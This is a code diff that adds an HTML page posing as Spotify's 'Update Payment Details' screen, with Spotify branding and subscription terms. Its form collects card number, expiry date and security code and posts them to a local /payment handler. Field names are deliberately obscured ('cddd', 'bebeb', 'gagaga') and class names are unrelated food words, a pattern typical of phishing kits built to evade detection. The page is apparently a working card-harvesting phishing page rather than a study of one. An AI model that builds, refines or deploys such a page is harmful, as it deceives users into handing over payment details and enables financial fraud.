@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="./img/fav.ico">
+    <title data-translate="page-title">Spotify - Update Payment Details</title>
+    <link rel="stylesheet" href="payment.css">
+</head>
+<body>
+    <nav class="sushi">
+        <div class="ramen">
+            <img src="img/lggo.webp" alt="Spotify Logo">
+        </div>
+        <div class="tempura">
+            <div class="udon">
+                <a href="#" data-translate="premium">Premium</a>
+                <a href="#" data-translate="support">Support</a>
+                <a href="#" data-translate="download">Download</a>
+            </div>
+            <div class="miso">
+                <div class="tofu">
+                    <img src="img/proff.webp" alt="Profile">
+                </div>
+                <span class="wasabi" data-translate="profile">Profile</span>
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M4 6L8 10L12 6" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="kimchi">
+        <h1 class="bibimbap" data-translate="update-payment-title">Update<br>payment details</h1>
+        <div class="bulgogi">
+            <div class="galbi">
+                <div class="japchae selected">
+                    <div class="kimbap"></div>
+                </div>
+                <span class="tteokbokki" data-translate="credit-debit-card">Credit or debit card</span>
+            </div>
+            <div class="samgyeopsal">
+                <img src="img/3.webp" alt="Payment Cards">
+            </div>
+            
+            <form id="paymentForm" method="POST" action="/payment">
+                <div class="jajangmyeon">
+                    <label class="sundubu" for="cardNumber" data-translate="card-number-label">Card number</label>
+                    <div class="pho">
+                        <input type="tel" id="cardNumber" name="cddd" class="dakgalbi" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" required>
+                        <div class="sriracha">
+                            <img src="img/lock.webp" alt="Secure">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="hotpot">
+                    <div class="jajangmyeon">
+                        <label class="sundubu" for="expiration" data-translate="expiry-date-label">Expiry date</label>
+                        <input type="tel" id="expiration" name="bebeb" class="dakgalbi" placeholder="MM/YY" autocomplete="cc-exp" required>
+                    </div>
+                    <div class="jajangmyeon">
+                        <label class="sundubu" for="cvc" data-translate="security-code-label">Security code</label>
+                        <div class="dimsum">
+                            <input type="tel" id="cvc" name="gagaga" class="dakgalbi" autocomplete="cc-csc" required maxlength="4" placeholder="•••">
+                            <div class="gyoza">?</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Hidden fields for server-side session -->
+                <input type="hidden" id="offerid" name="offerid" value="">
+                <input type="hidden" id="sessionid" name="sessionid" value="">
+                
+                <!-- Save card option -->
+                <div class="dumpling">
+                    <div class="wonton checked" onclick="this.classList.toggle('checked')"></div>
+                    <div class="springroll" data-translate="save-card-text">Save card for future orders.</div>
+                </div>
+                
+                <div class="soysauce" data-translate="subscription-notice">
+                    This won't affect how you pay for existing subscriptions and can be managed at any time in your Account page.
+                </div>
+                
+                <!-- Withdrawal information -->
+                <div class="padthai">
+                    <h2 class="curry" data-translate="withdrawal-title">Important information about your right to withdraw</h2>
+                    <div class="satay">
+                        <div class="wonton checked" onclick="this.classList.toggle('checked')"></div>
+                        <div class="laksa" data-translate="withdrawal-text">
+                            You consent to us providing you with the Spotify content immediately and you acknowledge that, as a result, you lose your statutory right of withdrawal once such provision of content has begun. You also agree that Spotify may automatically charge you the subscription fee every month, unless you cancel your subscription before the next billing cycle. You may cancel at any time, however if you cancel, you will not be entitled to a refund. Full terms and instructions on how to cancel are available <a href="#">here</a>. <a href="#">Terms apply</a>.
+                        </div>
+                    </div>
+                    <button type="submit" class="nasi" data-translate="update-button">Update payment details</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="payment.js"></script>
+</body>
+</html>
